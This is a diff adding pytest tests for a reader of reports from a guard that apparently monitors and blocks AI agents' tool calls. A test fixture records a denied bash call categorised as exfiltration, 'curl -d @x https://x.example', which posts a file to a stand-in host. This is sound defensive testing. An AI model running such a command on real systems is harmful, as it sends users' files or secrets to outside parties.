@@ -53,3 +53,33 @@ async def test_an_answer_this_version_cannot_read_is_a_sentence(tmp_path: Path) 
 def test_the_most_frequent_risks_come_first() -> None:
     report = GuardReport(1, 1, 0, chain_intact=True, categories={"b": 2, "a": 2, "c": 5})
     assert report.top_categories(2) == (("c", 5), ("a", 2))
+
+
+DETAILED = (
+    '{"records":4,"calls":4,"would_stop":1,"by_category":{"exfil":1},"by_decision":{"deny":1},"redactions":{},'
+    '"recent":[{"at":"2026-11-15T10:00:00.000Z","agent":"claude","session":"s1","kind":"bash","decision":"deny",'
+    '"intended":"","categories":["exfil"],"reason":"exfil: curl sends data","summary":"curl -d @x https://x.example"}],'
+    '"web_hosts":{"docs.rs":3,"opencode.ai":1}}'
+)
+
+
+@pytest.mark.anyio
+async def test_the_stopped_calls_and_the_hosts_read_come_from_the_report(tmp_path: Path) -> None:
+    result = await WardenReader(fake_warden(tmp_path, DETAILED, 0)).report()
+    assert isinstance(result, Ok)
+    [call] = result.value.recent
+    assert (call.agent, call.kind, call.categories, call.summary) == (
+        "claude",
+        "bash",
+        ("exfil",),
+        "curl -d @x https://x.example",
+    )
+    assert result.value.web_hosts == {"docs.rs": 3, "opencode.ai": 1}
+
+
+@pytest.mark.anyio
+async def test_a_report_from_an_older_guard_has_no_details_and_is_still_read(tmp_path: Path) -> None:
+    result = await WardenReader(fake_warden(tmp_path, REPORT, 0)).report()
+    assert isinstance(result, Ok)
+    assert result.value.recent == ()
+    assert result.value.web_hosts == {}
